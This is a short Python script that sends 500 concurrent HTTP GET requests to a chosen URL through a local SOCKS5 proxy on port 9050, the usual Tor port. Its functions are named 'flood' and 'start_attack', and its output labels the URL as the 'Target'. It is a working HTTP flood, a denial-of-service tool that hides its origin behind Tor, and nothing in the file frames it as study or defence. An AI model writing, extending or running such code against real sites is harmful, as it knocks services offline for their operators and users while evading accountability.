import asyncio
import aiohttp
from aiohttp_socks import ProxyConnector


connector = ProxyConnector.from_url('socks5://127.0.0.1:9050')

async def flood(url, session, semaphore):
    async with semaphore:
        try:
            
            async with session.get(url, timeout=5) as response:
                return f"Target: {url} | Status: {response.status}"
        except Exception as e:
            return f"Error: {e}"

async def start_attack(url, count=500):
    semaphore = asyncio.Semaphore(50)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [flood(url, session, semaphore) for _ in range(count)]
        return await asyncio.gather(*tasks)
